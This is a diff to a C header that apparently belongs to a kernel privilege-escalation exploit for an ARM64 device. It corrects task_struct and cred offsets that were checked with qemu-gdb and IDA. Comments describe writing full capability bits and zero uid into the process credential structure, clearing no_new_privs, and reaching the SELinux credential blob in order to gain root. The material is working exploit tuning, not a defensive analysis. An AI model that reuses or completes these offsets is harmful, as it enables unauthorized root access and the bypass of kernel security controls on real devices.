@@ -138,20 +138,25 @@
 #define MM_OWNER_OFF 1032
 #define TASK_PID_OFF 0x5c8   /* gdb-verified: init pid=1 @0x5c8 (was 0x618 oppo) */
 #define TASK_TGID_OFF 0x5cc   /* gdb-verified: init tgid=1 @0x5cc */
-#define TASK_REAL_PARENT_OFF 0x628
-#define TASK_ATOMIC_FLAGS_OFF 0x5d8
+#define TASK_REAL_PARENT_OFF 0x5d8   /* qemu-gdb: init_task+0x5d8 == &init_task (self-ptr); layout pid0x5c8/tgid0x5cc/canary0x5d0/real_parent0x5d8 (unused in code, kept correct) */
+#define TASK_ATOMIC_FLAGS_OFF 0x5d8   /* KNOWN-WRONG placeholder: 0x5d8 is real_parent, not atomic_flags. Could not locate true offset in QEMU (init atomic_flags==0). NNP-clear at this ptr is a benign no-op (bit0 already 0); not required for root. TODO verify on device. */
 #define TASK_REAL_CRED_OFF 0x778
 #define TASK_CRED_OFF 0x780
 #define TASK_COMM_OFF 0x790
 #define TASK_TASKS_OFF 0x4c8   /* gdb-verified: tasks list -> comm="init" (was 0x550 oppo) */
 #define TASK_THREAD_INFO_FLAGS_OFF 0x00
-#define TASK_SECCOMP_OFF 0x8e8
+#define TASK_SECCOMP_OFF 0x8e8   /* UNVERIFIED: init_task reads 0/0/0 here (consistent but not proof; needs a task with seccomp). Carried from oppo; other task offsets differ so treat as suspect. */
 #define TASK_PI_BLOCKED_ON_OFF 0x898   /* ✓ IDA verified: rt_mutex_adjust_prio_chain LDR X28, [X19,#0x898] */
 
-#define CRED_UID_OFF 8
-#define CRED_SECUREBITS_OFF 40
-#define CRED_CAPS_OFF 48
-#define CRED_SECURITY_OFF 128
+/* cred layout — qemu-gdb verified against init_cred @0xffffffc012790930.
+ * CAP_FULL(0x000001ffffffffff) run lands at 0x30/0x38/0x40 = permitted/effective/bset,
+ * so cap_inheritable=0x28, securebits=0x24, uid=0x04 (standard 5.10, usage=4B).
+ * Previous values (8/40/48) were +4 too high: uid write skipped real uid(0x04),
+ * and the 5-word cap write overflowed into cred->user(0x50). */
+#define CRED_UID_OFF 4          /* was 8 (that was gid); qemu-gdb: uid@0x04 */
+#define CRED_SECUREBITS_OFF 36  /* 0x24; was 40/0x28 (that was cap_inheritable) */
+#define CRED_CAPS_OFF 40        /* 0x28 = cap_inheritable start; was 48/0x30 (permitted) -> 5-word write clobbered cred->user */
+#define CRED_SECURITY_OFF 128   /* 0x80; qemu-gdb: holds a kernel ptr (selinux blob) */
 #define SELINUX_CRED_BLOB_OFF 0
 #define SELINUX_CRED_OSID_OFF 0
 #define SELINUX_CRED_SID_OFF 4
